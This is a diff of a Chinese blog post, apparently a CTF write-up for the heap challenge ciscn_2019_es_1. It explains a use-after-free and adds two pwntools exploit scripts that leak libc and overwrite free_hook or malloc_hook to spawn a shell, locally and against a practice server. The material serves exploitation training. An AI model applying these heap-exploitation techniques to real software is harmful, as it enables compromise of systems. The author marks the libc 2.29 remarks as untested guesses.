@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="tcache只打了本地">
+<meta name="description" content="提示说是libc2.29，但是好像上错libc版本了。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ciscn_2019_es_1">
 <meta property="og:url" content="http://yoursite.com/2019/08/06/ciscn-2019-es-1/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="tcache只打了本地">
+<meta property="og:description" content="提示说是libc2.29，但是好像上错libc版本了。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-05T18:14:51.987Z">
+<meta property="og:updated_time" content="2019-08-06T00:45:19.717Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ciscn_2019_es_1">
-<meta name="twitter:description" content="tcache只打了本地">
+<meta name="twitter:description" content="提示说是libc2.29，但是好像上错libc版本了。">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -225,18 +225,19 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>tcache<br>只打了本地<br><a id="more"></a></p>
+        <p>提示说是libc2.29，但是好像上错libc版本了。<br><a id="more"></a></p>
 <h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.Add a 996 info</span><br><span class="line">2.Show info</span><br><span class="line">3.Call that 996 compary!</span><br><span class="line">4.I hate 996!</span><br></pre></td></tr></table></figure>
 <p>每次add会malloc(0x18)来创建一个chunk记录信息，其结构为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	name ----------&gt; content chunk</span><br><span class="line">size | call</span><br><span class="line">   call</span><br></pre></td></tr></table></figure>
 <p>call即free，free（*name），没有置零，存在UAF。</p>
-<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>先把tcache填满，然后利用UAF，show出unsortbin中的main_arena地址，获取libc地址。</p>
-<p>再double free，改写tcache的fd指针至free_hook，再次malloc控制free_hook，写上system，free一块内容为<code>/bin/sh</code>的chunk获取shell。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *sh=process(&quot;./ciscn_2019_es_1.dms&quot;)#sh=remote(&quot;f.buuoj.cn&quot;,20173)def add(size,name,call):	sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)	sh.sendlineafter(&quot;\n&quot;,str(int(size)))	sh.sendafter(&quot;\n&quot;,name)	sh.sendafter(&quot;\n&quot;,call)def show(index):	sh.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)	sh.sendlineafter(&quot;\n&quot;,str(index))def delete(index):	sh.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)	sh.sendlineafter(&quot;\n&quot;,str(index))add(0x80,&quot;tcache&quot;,&quot;tcache&quot;) 		 #index0add(0x80,&quot;/bin/sh\x00&quot;,&quot;/bin/sh\x00&quot;) #index1for i in range(8):	delete(0)show(0)sh.recvuntil(&quot;name:\n&quot;)leak=u64(sh.recv(6).ljust(8,&quot;\x00&quot;))main_arena=leak-96log.success(&quot;main_arena: &quot;+hex(main_arena))free_hook=main_arena+7336log.success(&quot;free_hook: &quot;+hex(free_hook))system=main_arena-0x39c800log.success(&quot;system: &quot;+hex(system))add(0x90,&quot;2&quot;,&quot;2&quot;) #index2delete(2)delete(2)add(0x90,p64(free_hook),&quot;call&quot;)add(0x90,p64(free_hook),&quot;call&quot;)add(0x90,p64(system),&quot;call&quot;)delete(1)sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>第一次做带tcache的题，有一点不明白</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x80,&quot;tcache&quot;,&quot;tcache&quot;) 		 #index0add(0x80,&quot;/bin/sh\x00&quot;,&quot;/bin/sh\x00&quot;) #index1for i in range(8):	delete(0)show(0)</span><br></pre></td></tr></table></figure>
-<p>这里如果不分配index为1的chunk，就会刚好填满tcache，如果分配index为1的这个chunk，填满tcache之后还会多出来一个unsortbin，</p>
-
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h3 id="ubuntu18-04本地"><a href="#ubuntu18-04本地" class="headerlink" title="ubuntu18.04本地"></a>ubuntu18.04本地</h3><p>先把tcache填满，然后利用UAF，show出unsortbin中的main_arena地址，获取libc地址。</p>
+<p>再double free，改写tcache的fd指针至<code>free_hook</code>，再次malloc控制<code>free_hook</code>，写上system，free一块内容为<code>/bin/sh</code>的chunk获取shell。</p>
+<h3 id="BUU-remote"><a href="#BUU-remote" class="headerlink" title="BUU remote"></a>BUU remote</h3><p>直接利用UAF，show出unsortbin中的main_arena地址，获取libc地址。<br>再double free，改写fastbin的fd指针至<code>malloc_hook-0x23</code>，再次malloc控制<code>malloc_hook</code>，写上onegadget，执行获取shell。</p>
+<p>//不知道是不是BUU上面所有题都无视题目本身用了给的那两个libc，如果是这样的话感觉做题不是很方便啊。</p>
+<h3 id="libc2-29"><a href="#libc2-29" class="headerlink" title="libc2.29"></a>libc2.29</h3><p>好像2.29里tcache就完全不能double free了，会遍历tcache，但是leak还是先填满tcache然后leak。double free就用fastbin，改写fastbin的fd指针至<code>malloc_hook-0x23</code>，再次malloc控制<code>malloc_hook</code>，写上onegadget，执行获取shell。</p>
+<p>//纯猜测，没有2.29环境</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h3 id="ubuntu18-04本地-1"><a href="#ubuntu18-04本地-1" class="headerlink" title="ubuntu18.04本地"></a>ubuntu18.04本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *sh=process(&quot;./ciscn_2019_es_1.dms&quot;)#sh=remote(&quot;f.buuoj.cn&quot;,20173)def add(size,name,call):	sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)	sh.sendlineafter(&quot;\n&quot;,str(int(size)))	sh.sendafter(&quot;\n&quot;,name)	sh.sendafter(&quot;\n&quot;,call)def show(index):	sh.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)	sh.sendlineafter(&quot;\n&quot;,str(index))def delete(index):	sh.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)	sh.sendlineafter(&quot;\n&quot;,str(index))add(0x80,&quot;tcache&quot;,&quot;tcache&quot;) 		 #index0add(0x80,&quot;/bin/sh\x00&quot;,&quot;/bin/sh\x00&quot;) #index1for i in range(8):	delete(0)show(0)sh.recvuntil(&quot;name:\n&quot;)leak=u64(sh.recv(6).ljust(8,&quot;\x00&quot;))main_arena=leak-96log.success(&quot;main_arena: &quot;+hex(main_arena))free_hook=main_arena+7336log.success(&quot;free_hook: &quot;+hex(free_hook))system=main_arena-0x39c800log.success(&quot;system: &quot;+hex(system))add(0x90,&quot;2&quot;,&quot;2&quot;) #index2delete(2)delete(2)add(0x90,p64(free_hook),&quot;call&quot;)add(0x90,p64(free_hook),&quot;call&quot;)add(0x90,p64(system),&quot;call&quot;)delete(1)sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="BUU-remote-1"><a href="#BUU-remote-1" class="headerlink" title="BUU remote"></a>BUU remote</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_1.dms&quot;)onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]sh=remote(&quot;f.buuoj.cn&quot;,20173)def add(size,name):	sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)	sh.sendlineafter(&quot;\n&quot;,str(int(size)))	sh.sendafter(&quot;\n&quot;,name)	sh.sendafter(&quot;\n&quot;,&quot;call&quot;)def show(index):	sh.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)	sh.sendlineafter(&quot;\n&quot;,str(index))def delete(index):	sh.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)	sh.sendlineafter(&quot;\n&quot;,str(index))add(0x80,&quot;/bin/sh\x00&quot;) #index0add(0x80,&quot;/bin/sh\x00&quot;) #index1delete(0)show(0)sh.recvuntil(&quot;name:\n&quot;)leak=u64(sh.recv(6).ljust(8,&quot;\x00&quot;))main_arena=leak-88log.success(&quot;main_arena: &quot;+hex(main_arena))malloc_hook=main_arena-0x10log.success(&quot;malloc_hook: &quot;+hex(malloc_hook))libcbase=main_arena-0x3C4B20add(0x60,&quot;2&quot;)add(0x60,&quot;3&quot;)delete(2)delete(3)delete(2)add(0x60,p64(malloc_hook-0x23))#index4add(0x60,&quot;5&quot;)add(0x60,&quot;6&quot;)add(0x60,&quot;a&quot;*19+p64(libcbase+onegadget[2]))delete(5)delete(5)sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -247,7 +248,7 @@
         <p><span>本文标题:</span><a href="/2019/08/06/ciscn-2019-es-1/">ciscn_2019_es_1</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
         <p><span>发布时间:</span>2019-08-06, 01:55:03</p>
-        <p><span>最后更新:</span>2019-08-06, 02:14:51</p>
+        <p><span>最后更新:</span>2019-08-06, 08:45:19</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/08/06/ciscn-2019-es-1/" title="ciscn_2019_es_1">http://yoursite.com/2019/08/06/ciscn-2019-es-1/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/08/06/ciscn-2019-es-1/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -277,7 +278,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单分析"><span class="toc-number">1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用思路"><span class="toc-number">2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">3.</span> <span class="toc-text">EXP</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单分析"><span class="toc-number">1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用思路"><span class="toc-number">2.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ubuntu18-04本地"><span class="toc-number">2.0.1.</span> <span class="toc-text">ubuntu18.04本地</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUU-remote"><span class="toc-number">2.0.2.</span> <span class="toc-text">BUU remote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libc2-29"><span class="toc-number">2.0.3.</span> <span class="toc-text">libc2.29</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">3.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ubuntu18-04本地-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">ubuntu18.04本地</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUU-remote-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">BUU remote</span></a></li></ol></li></ol></li></ol>
         
     </div>
     <style>
